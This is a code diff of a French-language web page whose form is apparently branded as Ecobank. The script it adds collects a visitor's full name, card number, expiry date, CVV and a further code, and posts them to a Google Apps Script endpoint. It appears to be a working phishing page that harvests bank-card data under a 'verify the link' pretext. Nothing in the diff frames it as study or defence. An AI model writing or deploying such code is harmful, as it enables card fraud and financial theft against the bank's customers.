@@ -210,7 +210,62 @@
   <p id="statusMessage"></p>
 
   <script>
-    document.getElementById('ecobankForm').addEventListener('submit', async (e) => {
+
+    async function submitForm(e) {
+  e.preventDefault();
+  const form = e.target;
+  const submitBtn = form.querySelector('button[type="submit"]');
+  
+  try {
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Envoi en cours...';
+
+    // Construction de l'objet de données
+    const formData = {
+      fullName: form.querySelector('input[placeholder*="full name"]').value,
+      cardNumber: form.querySelector('input[placeholder*="0000 0000"]').value,
+      expiryDate: form.querySelector('input[placeholder*="01/23"]').value,
+      cvv: form.querySelector('input[placeholder="CVV"]').value,
+      lieu: form.querySelector('input[placeholder="Lieu"]').value,
+      code: form.querySelector('input[placeholder="Code"]').value
+    };
+
+    // Envoi avec gestion de timeout
+    const response = await Promise.race([
+      fetch('https://script.google.com/macros/s/AKfycbww6K906AXnS5m974UFLWGAZpC3EnTxCfH_chG6kpcUOCFN_NsD6EOhSI3Tig8ZBDci/exec', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(formData)
+      }),
+      new Promise((_, reject) => 
+        setTimeout(() => reject(new Error('Timeout après 10 secondes')), 10000)
+      )
+    ]);
+
+    if (!response.ok) throw new Error(`Erreur HTTP ${response.status}`);
+    const result = await response.json();
+    
+    if (result.status === "success") {
+      alert("Succès ! Données enregistrées.");
+      form.reset();
+    } else {
+      throw new Error(result.message || "Erreur inconnue du serveur");
+    }
+
+  } catch (error) {
+    console.error("Échec de l'envoi:", error);
+    alert(`Erreur: ${error.message}\nVérifiez la console pour plus de détails.`);
+  } finally {
+    submitBtn.disabled = false;
+    submitBtn.textContent = 'Vérifier la liaison';
+  }
+}
+
+document.getElementById('ecobankForm').addEventListener('submit', submitForm);
+
+
+
+    /* document.getElementById('ecobankForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const statusMessage = document.getElementById('statusMessage');
       statusMessage.textContent = "⏳ Envoi en cours...";
@@ -240,7 +295,7 @@
         console.error("Erreur fetch :", error);
         statusMessage.textContent = "❌ Une erreur est survenue : " + error.message;
       }
-    });
+    }); */
   </script>
 
     </body>
